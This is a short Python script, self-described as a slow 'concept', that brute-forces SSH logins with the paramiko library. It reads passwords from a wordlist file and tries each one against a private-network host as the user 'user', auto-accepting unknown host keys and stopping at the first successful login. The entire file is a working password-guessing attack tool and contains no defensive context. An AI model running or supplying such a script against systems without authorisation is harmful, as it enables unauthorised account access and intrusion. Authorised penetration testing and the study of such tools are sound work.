#!/usr/bin/env python3

# A very very slow ssh bruteforcing script... (just a concept)

import paramiko

server = paramiko.SSHClient()
server.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # automatically setting keys for new connections

passd = open('passwords.txt', 'r')

while True:
    try:
        line = passd.readline()
        if not line:  # detect when the file ends
            passd.close()
            server.close
            break
        print(line.strip())
        server.connect('192.168.1.244', username='user', password=line.strip())
        print("Login succeeded with: " + line.strip())  # stop the script when the pass is valid
        passd.close()
        break
    except paramiko.ssh_exception.AuthenticationException:  # detect when pass failes
        print('login failed')
        pass
server.close()
passd.close()
